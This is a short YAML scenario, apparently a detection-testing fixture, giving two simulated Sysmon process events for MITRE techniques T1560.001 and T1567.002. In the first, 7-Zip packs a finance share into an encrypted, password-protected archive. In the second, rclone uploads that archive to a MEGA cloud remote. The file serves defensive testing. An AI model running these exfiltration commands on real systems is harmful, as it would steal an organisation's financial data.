title: Finance data archived and pushed to cloud storage
techniques: [T1560.001, T1567.002]
events:
  - {service: sysmon, event_id: 1, hostname: WS-051, user: dave, process_name: 'C:\Program Files\7-Zip\7z.exe', command_line: '7z.exe a -mhe=on -pX9!q C:\Users\Public\f.7z C:\Shares\Finance', message: Process created}
  - at: 6m
    event: {service: sysmon, event_id: 1, hostname: WS-051, user: dave, process_name: 'C:\Users\Public\rclone.exe', command_line: 'rclone.exe copy C:\Users\Public\f.7z mega:backup --transfers 8', message: Process created}
